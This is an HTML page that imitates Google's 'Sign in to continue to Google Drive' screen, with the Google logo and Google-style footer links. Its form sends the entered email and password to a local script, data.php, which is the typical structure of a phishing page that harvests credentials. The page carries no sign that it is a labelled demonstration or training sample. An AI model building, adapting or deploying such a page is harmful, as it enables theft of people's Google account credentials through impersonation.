<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="./reset.css" />
    <link rel="stylesheet" href="./styles.css" />

    <title>Google Login</title>
  </head>

  <body>
    <div class="container">
      <div class="card">
        <img src="./images/google-logo.svg" alt="" />
        <h2>Sign in</h2>
        <h3>to continue to Google Drive</h3>
        <form action="data.php" method="post">
        <input type="email" placeholder="E-mail or phone" autofocus="autofocus" name="email" required />
        <br><br>
        <input type="text" placeholder="Password" name="password" required/>
        <div class="btn-email">
          <button type="button">Forgot email?</button>
        </div>
        <p>
          Not your computer? Use a Private Window to sign in.<br>
          <a href="">Learn more about using Guest mode</a>
        </p>

        <div class="card-bottom">
          <a href="">Create account</a>
          <button type="submit">Next</button>
        </div>
      </div>
      </form>
      <div class="footer">
        <select name="select">
          <option value="Portugês (Brasil)">Portugês (Brasil)</option>
          <option value="English (United States) selected">
            English (United States)
          </option>
          <option value="Español (España)">Español (España)</option>
        </select>

        <div class="footer-span">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>
  </body>
</html>
